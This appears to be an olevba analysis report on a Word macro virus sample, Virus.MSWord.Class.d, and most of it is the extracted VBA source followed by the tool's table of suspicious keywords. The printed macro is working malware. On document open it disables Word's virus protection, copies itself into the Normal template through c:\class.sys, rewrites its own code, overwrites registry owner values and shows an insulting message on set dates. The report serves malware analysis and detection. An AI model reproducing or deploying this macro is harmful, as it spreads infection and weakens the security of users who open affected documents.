olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-d8b2e13dc77e1a6da9554c20278dd59cd9bb20bd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-d8b2e13dc77e1a6da9554c20278dd59cd9bb20bd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'Alex29.03.05 14:13:54HP DeskJet 930C Series on LPT1:Вопросы111
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
Const REG_SZ As Long = 1
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
Const HKEY_CURRENT_USER As Long = &H80000001
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
Sub AutoOpen()
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
On Error GoTo out
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
Options.VirusProtection = False
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
Options.SaveNormalPrompt = False
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
Options.ConfirmConversions = False
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
If nt > 70 And ad > 0 Then GoTo out
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
If nt < 70 Then
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
End If
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
host.codemodule.AddFromFile ("c:\class.sys")
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
With host.codemodule
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
    For x = 1 To 16
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
    .deletelines 1
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
    Next x
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
End With
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
If nt < 70 Then
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
    With host.codemodule
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
    .replaceline 1, "Sub AutoClose()"
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
    .replaceline 91, "Sub ToolsMacro()"
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
    For x = 70 To 81
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
        .deletelines 62
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
    Next x
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
    .replaceline 35, "    For x = 1 To 4"
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
    End With
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
End If
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
If nt < 70 Then
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
u = RegCloseKey(k)
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
End If
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
With host.codemodule
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
    For x = 2 To 104 Step 2
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
    Next x
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
End With
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
out:
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
End Sub
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
Sub ViewVBCode()
'Alex29.03.05 14:13:55HP DeskJet 930C Series on LPT1:Вопросы111
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

